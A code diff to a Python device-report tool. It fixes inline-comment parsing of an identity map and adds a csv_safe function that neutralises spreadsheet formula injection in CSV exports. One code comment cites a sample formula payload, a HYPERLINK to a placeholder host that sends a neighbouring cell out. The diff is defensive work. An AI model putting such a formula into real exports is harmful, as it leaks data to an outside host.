@@ -190,6 +190,15 @@ def load_identity_map(path):
             line = line.strip()
             if not line or line.startswith("#"):
                 continue
+            # Drop an inline comment. suggest_identity_csv writes the local
+            # username it matched on after the value, so a deployer can see
+            # why each row was proposed. Without this the comment became part
+            # of the identity: feeding the tool's own suggested file straight
+            # back in, which is what the docs tell you to do, put
+            # "jo.bloggs  # via local user Jo.Bloggs" on every report.
+            line = line.split("#", 1)[0].strip()
+            if not line:
+                continue
             parts = [c.strip() for c in line.split(",", 1)]
             if len(parts) == 2 and parts[0] and parts[1]:
                 if parts[0].lower() in ("key", "device", "local_user"):
@@ -236,6 +245,36 @@ def suggest_identity_rows(devices, identities):
     return matched, unmatched
 
 
+# A cell that a spreadsheet would run rather than display. csv handles commas
+# and quotes; it has no opinion about formulas, because they are not a CSV
+# concept at all. Excel, LibreOffice and Sheets all evaluate a cell beginning
+# with one of these, so a device named =HYPERLINK("http://x/"&A1) exfiltrates
+# the row next to it the moment somebody opens the export.
+#
+# Leading whitespace counts: a tab or carriage return before the character is
+# stripped by the spreadsheet and the formula still runs.
+_FORMULA_LEAD = ("=", "+", "-", "@", "\t", "\r")
+
+
+def csv_safe(value):
+    """A cell a spreadsheet will display rather than evaluate.
+
+    Prefixed with an apostrophe, which spreadsheets read as "treat what follows
+    as text" and do not show. That is the conventional fix and it is visible in
+    the raw file, which is the honest trade: the exported value is not byte
+    identical to the finding, and a reader diffing the two should be able to
+    see why.
+
+    Applied to strings only. The counts are integers and cannot carry a
+    formula.
+    """
+    s = "" if value is None else str(value)
+    if not s:
+        return s
+    return "'" + s if (s[0] in _FORMULA_LEAD
+                       or s.lstrip("\t\r\n ").startswith(_FORMULA_LEAD)) else s
+
+
 def suggest_identity_csv(matched, unmatched):
     """The same proposals as a CSV a deployer can save, edit and feed back."""
     out = [
@@ -245,7 +284,8 @@ def suggest_identity_csv(matched, unmatched):
         "# on a report.",
     ]
     for m in matched:
-        out.append("%s,%s  # via local user %s" % (m["key"], m["identity"], m["via"]))
+        out.append("%s,%s  # via local user %s"
+                   % (csv_safe(m["key"]), csv_safe(m["identity"]), m["via"]))
     if unmatched:
         out.append("#")
         out.append("# No candidate identity. Fill these in from your MDM, RMM or CMDB:")
@@ -979,8 +1019,8 @@ def register_csv(rows):
     w.writerow(REGISTER_COLUMNS)
     for r in rows:
         w.writerow([
-            ";".join(r[c]) if isinstance(r.get(c), list)
-            else ("" if r.get(c) is None else r.get(c))
+            csv_safe(";".join(r[c])) if isinstance(r.get(c), list)
+            else ("" if r.get(c) is None else csv_safe(r.get(c)))
             for c in REGISTER_COLUMNS
         ])
     return out.getvalue()
